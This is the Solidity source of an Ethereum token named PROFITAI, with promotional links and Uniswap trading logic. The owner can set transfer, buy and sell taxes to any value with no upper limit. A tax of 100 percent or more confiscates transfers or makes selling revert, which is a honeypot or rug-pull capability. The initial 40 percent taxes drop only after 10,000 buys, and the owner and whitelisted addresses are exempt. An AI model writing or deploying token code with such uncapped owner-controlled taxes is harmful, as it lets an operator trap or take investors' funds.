// SPDX-License-Identifier: MIT

/*
Website: https://www.profitaieth.com/
Twitter: https://x.com/profitaieth?s=21
Telegram: https://t.me/PROFITAIPORTAL
*/

/*** Solidity version declaration ***/
pragma solidity 0.8.20;

/*** Default ERC20 functions and events ***/
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/*** Uniswap pair creation ***/
interface IUniswapV2Factory {
    /* Creates a new liquidity pool (pair) for the two specified ERC-20 tokens `tokenA` and `tokenB` */
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

/*** Uniswap pair swap ***/
interface IUniswapV2Router02 {
    /* Swaps an exact amount of input tokens for as much ETH as possible */
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    /* Returns the address of the Uniswap factory contract */
    function factory() external pure returns (address);
    /* Returns the address of the Wrapped Ether (WETH) contract */
    function WETH() external pure returns (address);
}

/*** Math operations with checks ***/
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 result = a + b;
        require(result >= a, "SafeMath: addition overflow");
        return result;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 result = a - b;
        require(b <= a, "SafeMath: subtraction underflow");
        return result;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 result = a * b;
        require(result / a == b, "SafeMath: multiplication overflow");
        return result;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint result = a / b;
        require(b > 0, "SafeMath: modulus by zero");
        return result;
    }
}

/*** Processes blockchain data ***/
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/*** Processes contract ownership ***/
contract Ownable is Context {
        /** Variables **/

    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

        /** Constructor **/

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

        /** Modifiers **/

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

        /** Getters **/

    function owner() public view returns (address) {
        return _owner;
    }

        /** Main **/

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

/*** Processes main contract logic ***/
contract ProfitAI is Context, IERC20, Ownable {
        /** Variables **/

    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    address payable private _taxWallet;
    uint256 private _transferTax = 0;
    uint256 private _initialBuyTax = 40;
    uint256 private _initialSellTax = 40;
    uint256 private _finalBuyTax = 5;
    uint256 private _finalSellTax = 5;
    uint256 private _reduceBuyTaxAt = 10000; // refers to '_buyCount'
    uint256 private _reduceSellTaxAt = 10000; // refers to '_buyCount'
    uint256 private _preventSwapBefore = 10; // refers to '_buyCount'
    uint256 private _buyCount = 0; // increases with every purchase from not whitelisted addresses

    bool private inSwap = false;
    bool private swapEnabled = false;

    string private constant _name = unicode"PROFITAI";
    string private constant _symbol = unicode"PROFIT";
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 10_000_000 * 10**_decimals; // 10m (all)
    uint256 public _maxTxAmount = 100_000 * 10**_decimals; // 100k (1%)
    uint256 public _maxWalletSize = 200_000 * 10**_decimals; // 200k (2%)
    uint256 public _taxSwapThreshold = 20_000 * 10**_decimals; // 20k (0.2%)
    uint256 public _maxTaxSwap = 100_000 * 10**_decimals; // 100k (1%)

    event MaxTxAmountUpdated(uint _maxTxAmount);

        /** Constructor **/

    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _totalSupply;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

        /** Modifiers **/

    /* When added to function, handles tax swap flag 'inSwap' */
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

        /** Getters **/

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transferTax() public view  returns (uint256) {
        return _transferTax;
    }

    function initialBuyTax() public view returns (uint256) {
        return _initialBuyTax;
    }

    function initialSellTax() public view  returns (uint256) {
        return _initialSellTax;
    }

    function getBalances(address[] memory wallets) public view returns (uint256[] memory) {
        uint256[] memory balancesLocal = new uint256[](wallets.length);

        for (uint index = 0; index < wallets.length; index++) {
            balancesLocal[index] = _balances[wallets[index]];
        }

        return balancesLocal;
    }

    function checkIsAddressWhitelistedSingle(address checkAddress) public view returns (bool) {
        return _isExcludedFromFee[checkAddress];
    }

    function checkIsAddressWhitelistedGroup(address[] memory checkAddresses) public view returns (bool[] memory) {
        bool[] memory result = new bool[](checkAddresses.length);
        for (uint index = 0; index < checkAddresses.length; index++) {
            result[index] = _isExcludedFromFee[checkAddresses[index]];
        }
        return result;
    }

        /** Setters **/

    function setTransferTax(uint256 newTransferTax) public onlyOwner returns (bool) {
        _transferTax = newTransferTax;
        return true;
    }

    function setInitialBuyTax(uint256 newInitialBuyTax) public onlyOwner returns (bool) {
        _initialBuyTax = newInitialBuyTax;
        return true;
    }

    function setInitialSellTax(uint256 newInitialSellTax) public onlyOwner returns (bool) {
        _initialSellTax = newInitialSellTax;
        return true;
    }

    function addToWhitelistSingle(address newAddress) public onlyOwner {
        _isExcludedFromFee[newAddress] = true;
    }

    function addToWhitelistGroup(address[] calldata newAddresses) public onlyOwner {
        for (uint256 i = 0; i < newAddresses.length; i++) {
            _isExcludedFromFee[newAddresses[i]] = true;
        }
    }

        /** Helper (Additional) **/

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    /* Note: 'lockSwap' handles tax swap flag 'inSwap' */
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    /* Manual swap token-tax to ETH. Note: in this case, tax swap limits do not apply */
    function manualSwap() external {
        require(_msgSender() == _taxWallet); // instead of 'onlyOwner' modifier (will still work after renounce)

        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance); // swap token-tax for ETH
        }

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance); // send ETH to '_taxWallet'
        }
    }

    /* Create a pair
       Main-net v2 router address: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
       Base-net v2 router address: 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24
     */
    function openTrading() external onlyOwner() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletSize = _totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

        /** Main (Transfer) **/

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;

        // from == uniswapV2Pair: Buy | to == uniswapV2Pair: Sell
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_transferTax).div(100); // transfer tax

            // buy
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100); // buy tax
                _buyCount++;
            }

            // sell
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100); // sell tax
            }

            // tax swap on sell
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap))); // swap token-tax for ETH (max: '_maxTaxSwap')
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance); // send tax ETH to '_taxWallet'
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount); // add token-tax to contract balance
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount); // remove 'amount' from sender balance
        _balances[to] = _balances[to].add(amount.sub(taxAmount)); // add 'amount' minus 'tax' to recipient balance
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    // contract can receive ETH
    receive() external payable {}
}